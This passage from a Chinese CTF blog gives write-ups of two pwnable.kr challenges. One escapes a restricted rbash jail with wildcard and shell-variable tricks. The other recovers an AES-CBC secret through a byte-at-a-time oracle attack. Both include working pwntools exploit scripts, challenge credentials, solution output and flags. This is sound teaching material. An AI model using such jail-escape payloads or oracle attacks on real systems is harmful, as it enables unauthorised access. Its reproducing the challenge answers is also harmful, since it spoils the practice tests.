<li>程序使用<code>env</code>命令重写了<code>PATH</code>变量开启了新的命令执行环境，并且使用<code>/bin/rbash</code>（受限制shell）来执行输入的命令。<br>题目需要绕过这些限制并读取到<code>password</code>然后提交即可getfalg。<br>先执行一下程序（注意先阅读readme）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cmd3@ubuntu:~$ nc 0 9023</span><br><span class="line">total 5268</span><br><span class="line">drwxr-x---  5 root cmd3_pwn    4096 Mar 15  2016 .</span><br><span class="line">drwxr-xr-x 87 root root        4096 Dec 27  2017 ..</span><br><span class="line">d---------  2 root root        4096 Jan 22  2016 .bash_history</span><br><span class="line">-rwxr-x---  1 root cmd3_pwn    1421 Mar 11  2016 cmd3.py</span><br><span class="line">drwx-wx---  2 root cmd3_pwn   24576 Jul 10 20:07 flagbox</span><br><span class="line">drwxr-x---  2 root cmd3_pwn    4096 Jan 22  2016 jail</span><br><span class="line">-rw-r--r--  1 root root     5345137 Jul 10 20:09 log</span><br><span class="line">-rw-r-----  1 root root         764 Mar 10  2016 super.pl</span><br><span class="line">total 8</span><br><span class="line">drwxr-x--- 2 root cmd3_pwn 4096 Jan 22  2016 .</span><br><span class="line">drwxr-x--- 5 root cmd3_pwn 4096 Mar 15  2016 ..</span><br><span class="line">lrwxrwxrwx 1 root root        8 Jan 22  2016 cat -&gt; /bin/cat</span><br><span class="line">lrwxrwxrwx 1 root root       11 Jan 22  2016 id -&gt; /usr/bin/id</span><br><span class="line">lrwxrwxrwx 1 root root        7 Jan 22  2016 ls -&gt; /bin/ls</span><br><span class="line">your password is in flagbox/KG3TSCVOPHSPINJD1N3MOD3T637CLX5L</span><br><span class="line">cmd3$</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>可以看到我们只能执行<code>jail</code>目录下的三个程序，其他程序由于需要跨目录执行，必须使用<code>/</code>符号，然而在<code>/bin/rbash</code>中是不允许命令中带有<code>/</code>符号的（关于受限制shell可以参考<a href="https://www.howtoing.com/rbash-a-restricted-bash-shell-explained-with-practical-examples/" target="_blank" rel="noopener">rbash - 一个受限的Bash Shell用实际示例说明</a>）。对于该题目来说只需要执行<code>cat flagbox/KG3TSCVOPHSPINJD1N3MOD3T637CLX5L</code>获得password即可。但是要执行该命令需要考虑绕过空格和字母数字，因为这些字符无法通过<code>filter</code>函数。接下来只要绕过这些即可。</p>
<ol>
<li>绕过空格。对于<code>cat</code>命令，可以使用<code>&lt;</code>符号来代替空格。也可使用其他方法，参考<a href="https://www.cnblogs.com/sevck/p/6072721.html" target="_blank" rel="noopener">linux下不用空格执行带参数的5种姿势</a>。</li>
<li>绕过字符数字。要想绕过最常用最重要的字母数字，必须借用已经有的字母数字。在linux下有很多通配符可以用来指代某些文件，<code>*</code>符号被过滤了可以使用<code>?</code>（表示该位置必有一个字符）来指代。例如，要指代<code>jail/cat</code>可以输入<code>????/???</code>即可。当然，如果出现了指代多个文件或目录的情况它一般指代<code>ls</code>命令排序后的第一个。但是，对于受限制shell来说使用上面指代的话还是会出现<code>/</code>符号导致无法执行，我们必须执行<code>cat</code>而不是用路径指代它。这时，需要了解<code>$_</code>变量，该变量在shell中指代上次执行的命令，这样我们可以先使用上面的方式执行一遍，然后操作<code>$_</code>变量获取它的子串<code>cat</code>即可。可以输入<code>????/???;${__=${_#?????}};</code>来将<code>cat</code>保存在<code>$___</code>变量中。对于linux下的环境变量的操作可以参考<a href="https://blog.csdn.net/number_0_0/article/details/73291182" target="_blank" rel="noopener">https://blog.csdn.net/number_0_0/article/details/73291182</a>。要解决<code>flagbox/KG3TSCVOPHSPINJD1N3MOD3T637CLX5L</code>这样的长字符串，可以利用<code>cat</code>命令来从<code>/tmp/</code>（任何用户可读写）目录下的文件读取。例如，将长字符串写入<code>/tmp/__/1</code>中，然后执行<code>$(cat&lt;/???/__/?)</code>这样<code>$_</code>变量就存有长字符串了。<br>下面是exp<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = ssh(port=<span class="number">2222</span>,user=<span class="string">"cmd3"</span>,host=<span class="string">"pwnable.kr"</span>,password=<span class="string">"FuN_w1th_5h3ll_v4riabl3s_haha"</span>)</span><br><span class="line">poc = <span class="string">"????/???;$&#123;__=$&#123;_#?????&#125;&#125;;$($__&lt;/???/__/?);$&#123;___=$_&#125;;$__&lt;$___"</span></span><br><span class="line"></span><br><span class="line">r = s.run(<span class="string">"nc 0 9023"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"your password is in "</span>)</span><br><span class="line">data = r.recvline().rstrip() <span class="comment">#get flagbox/......</span></span><br><span class="line">s.run(<span class="string">"mkdir /tmp/__"</span>)</span><br><span class="line">s.run(<span class="string">'echo "&#123;0&#125;" &gt;/tmp/__/1'</span>.format(data))</span><br><span class="line">r.recvuntil(<span class="string">"cmd3$ "</span>)</span><br><span class="line">r.sendline(poc)</span><br><span class="line">tmp = r.recvuntil(<span class="string">"cmd3$ "</span>)</span><br><span class="line">pwd = tmp[<span class="number">-38</span>:<span class="number">-6</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Get pwd: &#123;0&#125;'</span>.format(pwd)</span><br><span class="line">r.sendline(pwd)</span><br><span class="line"><span class="keyword">print</span> r.recvall()</span><br></pre></td></tr></table></figure>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# python poc.py</span><br><span class="line">[+] Connecting to pwnable.kr on port 2222: Done</span><br><span class="line">[!] Couldn&apos;t check security settings on &apos;pwnable.kr&apos;</span><br><span class="line">[+] Opening new channel: &apos;nc 0 9023&apos;: Done</span><br><span class="line">[+] Opening new channel: &apos;mkdir /tmp/__&apos;: Done</span><br><span class="line">[+] Opening new channel: &apos;echo &quot;flagbox/9E36W2ZIM8Y0I4GWLPMKPE1GAQPGCMFO&quot; &gt;/tmp/__/1&apos;: Done</span><br><span class="line">Get pwd: 5AE535O9P84VCXKWS1PYYRRT8JLD3JQN</span><br><span class="line">[+] Receiving all data: Done (54B)</span><br><span class="line">[*] Closed SSH channel with pwnable.kr</span><br><span class="line">Congratz! here is flag : D4ddy_c4n_n3v3r_St0p_m3_haha</span><br><span class="line"></span><br><span class="line">[*] Closed SSH channel with pwnable.kr</span><br><span class="line">[*] Closed SSH channel with pwnable.kr</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题目很有意思，主要使用linux下shell的知识，又学到了不少。</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://r00tnb.github.io/2018/04/24/pwnable.kr-crypto1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/04/24/pwnable.kr-crypto1/" itemprop="url">
                  pwnable.kr-crypto1
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-04-24 13:21:27" itemprop="dateCreated datePublished" datetime="2018-04-24T13:21:27+08:00">2018-04-24</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/04/24/pwnable.kr-crypto1/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/04/24/pwnable.kr-crypto1/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/04/24/pwnable.kr-crypto1/" class="leancloud_visitors" data-flag-title="pwnable.kr-crypto1">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这虽然不是一道二进制的题目，但是也有足够的pwn味道。</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>题目是用了python写的b/s结构，代码逻辑简单。<br><strong>client.py</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"><span class="keyword">import</span> xmlrpclib</span><br><span class="line">rpc = xmlrpclib.ServerProxy(<span class="string">"http://localhost:9100/"</span>)</span><br><span class="line"></span><br><span class="line">BLOCK_SIZE = <span class="number">16</span></span><br><span class="line">PADDING = <span class="string">'\x00'</span></span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING</span><br><span class="line">EncodeAES = <span class="keyword">lambda</span> c, s: c.encrypt(pad(s)).encode(<span class="string">'hex'</span>)</span><br><span class="line">DecodeAES = <span class="keyword">lambda</span> c, e: c.decrypt(e.decode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># server's secrets</span></span><br><span class="line">key = <span class="string">'erased. but there is something on the real source code'</span></span><br><span class="line">iv = <span class="string">'erased. but there is something on the real source code'</span></span><br><span class="line">cookie = <span class="string">'erased. but there is something on the real source code'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># guest / 8b465d23cb778d3636bf6c4c5e30d031675fd95cec7afea497d36146783fd3a1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sanitize</span><span class="params">(arg)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> arg:</span><br><span class="line">		<span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">'1234567890abcdefghijklmnopqrstuvwxyz-_'</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AES128_CBC</span><span class="params">(msg)</span>:</span></span><br><span class="line">	cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">	<span class="keyword">return</span> EncodeAES(cipher, msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_auth</span><span class="params">(id, pw)</span>:</span></span><br><span class="line">	packet = <span class="string">'&#123;0&#125;-&#123;1&#125;-&#123;2&#125;'</span>.format(id, pw, cookie)</span><br><span class="line">	e_packet = AES128_CBC(packet)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'sending encrypted data (&#123;0&#125;)'</span>.format(e_packet)</span><br><span class="line">	sys.stdout.flush()</span><br><span class="line">	<span class="keyword">return</span> rpc.authenticate(e_packet)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'---------------------------------------------------'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'-       PWNABLE.KR secure RPC login system        -'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'---------------------------------------------------'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">''</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'Input your ID'</span></span><br><span class="line">	sys.stdout.flush()</span><br><span class="line">	id = raw_input()</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'Input your PW'</span></span><br><span class="line">	sys.stdout.flush()</span><br><span class="line">	pw = raw_input()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> sanitize(id) == <span class="keyword">False</span> <span class="keyword">or</span> sanitize(pw) == <span class="keyword">False</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'format error'</span></span><br><span class="line">		sys.stdout.flush()</span><br><span class="line">		os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	cred = request_auth(id, pw)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> cred==<span class="number">0</span> :</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'you are not authenticated user'</span></span><br><span class="line">		sys.stdout.flush()</span><br><span class="line">		os._exit(<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">if</span> cred==<span class="number">1</span> :</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'hi guest, login as admin'</span></span><br><span class="line">		sys.stdout.flush()</span><br><span class="line">		os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'hi admin, here is your flag'</span></span><br><span class="line">	<span class="keyword">print</span> open(<span class="string">'flag'</span>).read()</span><br><span class="line">	sys.stdout.flush()</span><br></pre></td></tr></table></figure></p>
<p><strong>server.py</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> xmlrpclib, hashlib</span><br><span class="line"><span class="keyword">from</span> SimpleXMLRPCServer <span class="keyword">import</span> SimpleXMLRPCServer</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line">BLOCK_SIZE = <span class="number">16</span></span><br><span class="line">PADDING = <span class="string">'\x00'</span></span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING</span><br><span class="line">EncodeAES = <span class="keyword">lambda</span> c, s: c.encrypt(pad(s)).encode(<span class="string">'hex'</span>)</span><br><span class="line">DecodeAES = <span class="keyword">lambda</span> c, e: c.decrypt(e.decode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># server's secrets</span></span><br><span class="line">key = <span class="string">'erased. but there is something on the real source code'</span></span><br><span class="line">iv = <span class="string">'erased. but there is something on the real source code'</span></span><br><span class="line">cookie = <span class="string">'erased. but there is something on the real source code'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AES128_CBC</span><span class="params">(msg)</span>:</span></span><br><span class="line">	cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">	<span class="keyword">return</span> DecodeAES(cipher, msg).rstrip(PADDING)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">authenticate</span><span class="params">(e_packet)</span>:</span></span><br><span class="line">	packet = AES128_CBC(e_packet)</span><br><span class="line"></span><br><span class="line">	id = packet.split(<span class="string">'-'</span>)[<span class="number">0</span>]</span><br><span class="line">	pw = packet.split(<span class="string">'-'</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> packet.split(<span class="string">'-'</span>)[<span class="number">2</span>] != cookie:</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>	<span class="comment"># request is not originated from expected server</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> hashlib.sha256(id+cookie).hexdigest() == pw <span class="keyword">and</span> id == <span class="string">'guest'</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256(id+cookie).hexdigest() == pw <span class="keyword">and</span> id == <span class="string">'admin'</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">server = SimpleXMLRPCServer((<span class="string">"localhost"</span>, <span class="number">9100</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Listening on port 9100..."</span></span><br><span class="line">server.register_function(authenticate, <span class="string">"authenticate"</span>)</span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure></p>
<p>分析代码可以知道，只有当<code>id=admin,pw=sha256(id+cookie)</code>时才能获得flag。然而我们不知道<code>cookie</code>的值，所以就无法计算出正确的<code>pw</code>。<br>从代码中可以看到，程序使用<code>aes128_cbc</code>的加密模式。做web的都知道，这种加密方式容易受到字节反转攻击，但是这里却无法使用，因为字节反转攻击需要响应中有解密出来的明文。但是这里，由于这种加密模式明文和密文的字节是一一对应的，并且在这道题目中<code>cookie</code>前面的字符数量可控制，所以可以找到一种方法来爆破出<code>cookie</code>的值。<br>具体方法是，控制要加密的明文中<code>cookie</code>前面的字符数量，使要爆破的字节刚好位于分组中的最后一组的最后一个字节。接下来爆破方法是，每次改变最后一个字节，并把客户端返回的对应分组的加密密文与没有改变时的加密密文对比，当相等时说明该字节就是对应的<code>cookie</code>字节。如此爆破下去直到找到完整的<code>cookie</code>。随后就计算正确的ID和PW即可。<br>下面是poc，但是要传到题目平台上去，不然会很慢。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">'error'</span>)</span><br><span class="line">cookie = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getRealEPack</span><span class="params">(ID,PW)</span>:</span></span><br><span class="line">	r = remote(<span class="string">'127.0.0.1'</span>,<span class="number">9006</span>)</span><br><span class="line">	r.recvuntil(<span class="string">'ID\n'</span>)</span><br><span class="line">	r.sendline(ID)</span><br><span class="line">	r.recvuntil(<span class="string">'PW\n'</span>)</span><br><span class="line">	r.sendline(PW)</span><br><span class="line">	s = r.recvline()</span><br><span class="line">	e_pack = s[s.find(<span class="string">'('</span>)+<span class="number">1</span>:<span class="number">-2</span>]</span><br><span class="line">	r.close()</span><br><span class="line">	<span class="keyword">return</span> e_pack</span><br><span class="line"></span><br><span class="line"><span class="comment">#get cookie</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">2</span>,<span class="number">100</span>):</span><br><span class="line">	pack = <span class="string">'-'</span>*(<span class="number">15</span>-i%<span class="number">16</span>)+<span class="string">'--'</span>+cookie</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'1234567890abcdefghijklmnopqrstuvwxyz-_!'</span>:</span><br><span class="line">		e_pack0 = getRealEPack(pack+j,<span class="string">''</span>)</span><br><span class="line">		e_pack1 = getRealEPack(<span class="string">'-'</span>*(<span class="number">15</span>-i%<span class="number">16</span>),<span class="string">''</span>)</span><br><span class="line">		<span class="keyword">if</span> e_pack0[:len(pack+j)*<span class="number">2</span>] == e_pack1[:len(pack+j)*<span class="number">2</span>]:</span><br><span class="line">			cookie += j</span><br><span class="line">			<span class="keyword">print</span> cookie</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> j == <span class="string">'!'</span>:</span><br><span class="line">			ID = <span class="string">'admin'</span></span><br><span class="line">			PW = hashlib.sha256(ID+cookie).hexdigest()</span><br><span class="line">			<span class="keyword">print</span> <span class="string">'ID: &#123;&#125;\nPW: &#123;&#125;'</span>.format(ID,PW)</span><br><span class="line">			exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
<p>运行后<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">fix@ubuntu:/tmp$ python 1.py</span><br><span class="line">y</span><br><span class="line">yo</span><br><span class="line">you</span><br><span class="line">you_</span><br><span class="line">you_w</span><br><span class="line">you_wi</span><br><span class="line">you_wil</span><br><span class="line">you_will</span><br><span class="line">you_will_</span><br><span class="line">you_will_n</span><br><span class="line">you_will_ne</span><br><span class="line">you_will_nev</span><br><span class="line">you_will_neve</span><br><span class="line">you_will_never</span><br><span class="line">you_will_never_</span><br><span class="line">you_will_never_g</span><br><span class="line">you_will_never_gu</span><br><span class="line">you_will_never_gue</span><br><span class="line">you_will_never_gues</span><br><span class="line">you_will_never_guess</span><br><span class="line">you_will_never_guess_</span><br><span class="line">you_will_never_guess_t</span><br><span class="line">you_will_never_guess_th</span><br><span class="line">you_will_never_guess_thi</span><br><span class="line">you_will_never_guess_this</span><br><span class="line">you_will_never_guess_this_</span><br><span class="line">you_will_never_guess_this_s</span><br><span class="line">you_will_never_guess_this_su</span><br><span class="line">you_will_never_guess_this_sug</span><br><span class="line">you_will_never_guess_this_suga</span><br><span class="line">you_will_never_guess_this_sugar</span><br><span class="line">you_will_never_guess_this_sugar_</span><br><span class="line">you_will_never_guess_this_sugar_h</span><br><span class="line">you_will_never_guess_this_sugar_ho</span><br><span class="line">you_will_never_guess_this_sugar_hon</span><br><span class="line">you_will_never_guess_this_sugar_hone</span><br><span class="line">you_will_never_guess_this_sugar_honey</span><br><span class="line">you_will_never_guess_this_sugar_honey_</span><br><span class="line">you_will_never_guess_this_sugar_honey_s</span><br><span class="line">you_will_never_guess_this_sugar_honey_sa</span><br><span class="line">you_will_never_guess_this_sugar_honey_sal</span><br><span class="line">you_will_never_guess_this_sugar_honey_salt</span><br><span class="line">you_will_never_guess_this_sugar_honey_salt_</span><br><span class="line">you_will_never_guess_this_sugar_honey_salt_c</span><br><span class="line">you_will_never_guess_this_sugar_honey_salt_co</span><br><span class="line">you_will_never_guess_this_sugar_honey_salt_coo</span><br><span class="line">you_will_never_guess_this_sugar_honey_salt_cook</span><br><span class="line">you_will_never_guess_this_sugar_honey_salt_cooki</span><br><span class="line">you_will_never_guess_this_sugar_honey_salt_cookie</span><br><span class="line">ID: admin</span><br><span class="line">PW: fcf00f6fc7f66ffcfec02eaf69d30398b773fa9b2bc398f960784d60048cc503</span><br><span class="line">fix@ubuntu:/tmp$</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/<span class="built_in">test</span><span class="comment"># nc pwnable.kr 9006</span></span><br><span class="line">---------------------------------------------------</span><br><span class="line">-       PWNABLE.KR secure RPC login system        -</span><br><span class="line">---------------------------------------------------</span><br><span class="line"></span><br><span class="line">Input your ID</span><br><span class="line">admin</span><br><span class="line">Input your PW</span><br><span class="line">fcf00f6fc7f66ffcfec02eaf69d30398b773fa9b2bc398f960784d60048cc503</span><br><span class="line">sending encrypted data 